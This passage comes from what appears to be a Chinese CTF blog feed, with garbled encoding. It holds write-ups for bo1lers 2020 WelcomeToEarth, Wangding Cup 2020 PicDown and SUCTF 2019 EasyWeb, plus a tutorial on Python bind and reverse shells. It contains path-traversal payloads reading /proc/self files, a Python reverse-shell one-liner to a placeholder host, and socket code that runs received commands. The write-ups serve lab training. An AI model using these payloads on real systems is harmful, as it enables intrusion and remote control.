class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">dietimer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span></code></pre><p>è®¿é—®chase</p><p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812022512230.png" alt="image-20210812022512230"></p><pre class=" language-javascript"><code class="language-javascript">      <span class="token keyword">function</span> <span class="token function">sleep</span><span class="token punctuation">(</span>ms<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>resolve <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">dietimer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">left</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">leftt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/leftt/"</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">function</span> <span class="token function">right</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token function">dietimer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>static/js/door.js</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">check_door</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> all_radio <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"door_form"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>elements<span class="token punctuation">;</span>  <span class="token keyword">var</span> guess <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> all_radio<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>all_radio<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>checked<span class="token punctuation">)</span> guess <span class="token operator">=</span> all_radio<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>  rand <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">360</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>rand <span class="token operator">==</span> guess<span class="token punctuation">)</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/open/"</span><span class="token punctuation">;</span>  <span class="token keyword">else</span> window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"/die/"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>static/js/fight.js</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Run to scramble original flag</span><span class="token comment" spellcheck="true">//console.log(scramble(flag, action));</span><span class="token keyword">function</span> <span class="token function">scramble</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> key<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> n <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">%</span> flag<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">let</span> temp <span class="token operator">=</span> flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    flag<span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> flag<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">check_action</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> action <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"{hey"</span><span class="token punctuation">,</span> <span class="token string">"_boy"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"s_im"</span><span class="token punctuation">,</span> <span class="token string">"ck!}"</span><span class="token punctuation">,</span> <span class="token string">"_baa"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"pctf"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// TODO: unscramble function</span><span class="token punctuation">}</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> itertools <span class="token keyword">import</span> permutationsflag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"{hey"</span><span class="token punctuation">,</span> <span class="token string">"_boy"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"s_im"</span><span class="token punctuation">,</span> <span class="token string">"ck!}"</span><span class="token punctuation">,</span> <span class="token string">"_baa"</span><span class="token punctuation">,</span> <span class="token string">"aaaa"</span><span class="token punctuation">,</span> <span class="token string">"pctf"</span><span class="token punctuation">]</span>item <span class="token operator">=</span> permutations<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> item<span class="token punctuation">:</span>   k <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">if</span> k<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'pctf{hey_boys'</span><span class="token punctuation">)</span> <span class="token operator">and</span> k<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'}'</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span></code></pre><p><img src="/2021/08/10/bo1lers-2020-welcometoearth/image-20210812144644613.png" alt="image-20210812144644613"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼Žæ¯ï¼š2020-PicDown</title>
      <link href="2021/08/09/wang-ding-bei-2020-picdown/"/>
      <url>2021/08/09/wang-ding-bei-2020-picdown/</url>
      
        <content type="html"><![CDATA[<h2 id="éžé¢„æœŸè§£"><a href="#éžé¢„æœŸè§£" class="headerlink" title="éžé¢„æœŸè§£"></a>éžé¢„æœŸè§£</h2><p><img src="/2021/08/09/wang-ding-bei-2020-picdown/1.png" alt="1"></p><p><img src="/2021/08/09/wang-ding-bei-2020-picdown/2.png" alt="2"></p><h2 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h2><pre><code>../../../proc/self/cmdline</code></pre><p><img src="/2021/08/09/wang-ding-bei-2020-picdown/3.png" alt="3"></p><p>è¯»å–app.py</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">import</span> os<span class="token keyword">import</span> urllibapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>f <span class="token operator">=</span> open<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/page'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">page</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> url<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>            <span class="token keyword">return</span> response        <span class="token keyword">else</span><span class="token punctuation">:</span>            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token string">"ok"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></code></pre><p>å¯ä»¥é€šè¿‡<code>/proc/pid/fd/</code>è¯»å–ï¼Œè¿™ä¸ªç›®å½•åŒ…å«äº†è¿›ç¨‹æ‰“å¼€çš„æ¯ä¸€ä¸ªæ–‡ä»¶çš„é“¾æŽ¥</p><pre><code>?url=../../../../proc/self/fd/</code></pre><p><img src="/2021/08/09/wang-ding-bei-2020-picdown/image-20210812014224853.png" alt="image-20210812014224853"></p><pre><code>æ‹¿åˆ°äº†keyï¼šwRL9H3ipk/8xXW/+XaTjJb70gYCVjQrU80ezyLqKYrs=</code></pre><p>ä½†æ˜¯shellæ‰§è¡Œçš„å‘½ä»¤ä¸ä¼šè¿”å›žï¼Œè¿™é‡Œä½¿ç”¨åå¼¹shellçš„æ–¹å¼ï¼Œåœ¨æ ¹ç›®å½•ä¸‹è¯»å–flag</p><p>åœ¨BUUæ–°å»ºä¸€ä¸ªå°å·ï¼Œä»Žbasicåˆ†ç±»å¼€å¯ä¸€å°é¶æœºï¼Œsshè¿žæŽ¥åŽæ‰§è¡Œ<code>nc -lvp 7777</code></p><pre><code>python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx.xx.xx.xx',7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python shellä¸Žåå¼¹shell</title>
      <link href="2021/08/08/python-shell-yu-fan-dan-shell/"/>
      <url>2021/08/08/python-shell-yu-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<p>æ­£å¸¸shelléœ€è¦å…ˆåœ¨æ”»å‡»ç«¯å¼€æœºæƒ…å†µä¸‹å¼€å¯ç¨‹åº,ç„¶åŽæ”»å‡»ç«¯è¿è¡Œç¨‹åº,æ‰èƒ½è¿žæŽ¥</p><p>åå¼¹shell,æ”»å‡»ç«¯æ˜¯æœåŠ¡ç«¯,è¢«æ”»å‡»ç«¯æ˜¯å®¢æˆ·ç«¯<br>æ­£å¸¸shell,æ”»å‡»ç«¯æ˜¯å®¢æˆ·ç«¯,è¢«æ”»å‡»ç«¯æ˜¯æœåŠ¡ç«¯ </p><p>åå¼¹shell,å…ˆå¯ç”¨æœåŠ¡ç«¯,å†å¯ç”¨å®¢æˆ·ç«¯</p><p>åå¼¹shellçš„å¥½å¤„å°±æ˜¯:ä¸€æ—¦è¢«æ”»å‡»ç«¯å¼€æœº,ç«‹å³è¿žæŽ¥ä¸Šæ”»å‡»ç«¯(éœ€è¦æ”»å‡»ç«¯ä¸€ç›´è¿è¡Œ)</p><h3 id="shellï¼š"><a href="#shellï¼š" class="headerlink" title="shellï¼š"></a>shellï¼š</h3><h4 id="å®¢æˆ·ç«¯ï¼š"><a href="#å®¢æˆ·ç«¯ï¼š" class="headerlink" title="å®¢æˆ·ç«¯ï¼š"></a>å®¢æˆ·ç«¯ï¼š</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sockets<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"XX.XX.XX.XX"</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#è¿žæŽ¥çš„æœåŠ¡å™¨çš„ipåœ°å€,ç«¯å£</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    com<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"command:"</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>com<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#å‘é€ä¿¡æ¯</span>    d<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#æŽ¥å—æ•°æ®çš„å¤§å°</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="æœåŠ¡ç«¯ï¼š"><a href="#æœåŠ¡ç«¯ï¼š" class="headerlink" title="æœåŠ¡ç«¯ï¼š"></a>æœåŠ¡ç«¯ï¼š</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> oss<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#åˆ›å»ºå¥—æŽ¥å­— #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span>s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">1234</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#ç»‘å®šåœ°å€å’Œç«¯å£#0.0.0.0æŽ¥æ”¶ä»»æ„å®¢æˆ·ç«¯ipè¿žæŽ¥</span>s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>                 <span class="token comment" spellcheck="true">#è°ƒç”¨listenæ–¹æ³•å¼€å§‹ç›‘å¬ç«¯å£ï¼Œä¼ å…¥çš„å‚æ•°ä¸ºç­‰å¾…è¿žæŽ¥çš„æœ€å¤§æ•°é‡</span>con<span class="token punctuation">,</span>addr<span class="token operator">=</span>s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#æŽ¥å—ä¸€ä¸ªå®¢æˆ·ç«¯çš„è¿žæŽ¥</span><span class="token comment" spellcheck="true">#print(con,addr)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cmd<span class="token operator">=</span>con<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>    command<span class="token operator">=</span>cmd<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> command<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"cd"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        os<span class="token punctuation">.</span>chdir<span class="token punctuation">(</span>command<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#åˆ‡æ¢è·¯å¾„</span>        result<span class="token operator">=</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#æ˜¾ç¤ºè·¯å¾„</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result<span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> result<span class="token punctuation">:</span>        con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>result<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        con<span class="token punctuation">.</span>send<span class="token punctuation">(</span>b<span class="token string">"OK!"</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SUCTFï¼š2019-EasyWeb</title>
      <link href="2021/08/07/suctf-2019-easyweb/"/>
      <url>2021/08/07/suctf-2019-easyweb/</url>
      
        <content type="html"><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!! </span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// æ–‡ä»¶ä¸­å­˜åœ¨â€œ&lt;?â€å°±è¿”å›žâ€œ^_^â€</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>å¼‚æˆ–è„šæœ¬ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">finds</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token 